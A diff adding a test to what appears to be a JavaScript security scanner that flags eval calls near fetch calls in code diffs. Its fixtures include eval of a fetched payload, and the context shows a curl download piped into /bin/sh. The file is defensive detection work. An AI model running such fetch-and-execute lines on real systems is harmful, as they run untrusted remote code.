@@ -178,6 +178,22 @@ describe("each pattern", () => {
     );
   });
 
+  it("looks for the fetch only among the five lines on each side of an eval", () => {
+    // A long hunk of evals with one fetch far above them: none is near it.
+    const evals = Array.from({ length: 5_000 }, () => "+eval(payload);");
+    const far = [" const res = await fetch(url);", ...Array(6).fill(" next();"), ...evals];
+    assert.deepEqual(scan(diff("load.js", far)), []);
+    // Five lines away still counts.
+    const near = [
+      " const res = await fetch(url);",
+      ...Array(4).fill(" next();"),
+      "+eval(payload);",
+    ];
+    assert.deepEqual(scan(diff("load.js", near)), [
+      { patternId: "rce.eval_fetched", file: "load.js", line: 6 },
+    ]);
+  });
+
   it("catches a download piped into a shell by path, through env or sudo, and into zsh", () => {
     const shells = [
       "+curl -fsSL https://example.test/i.sh | /bin/sh",
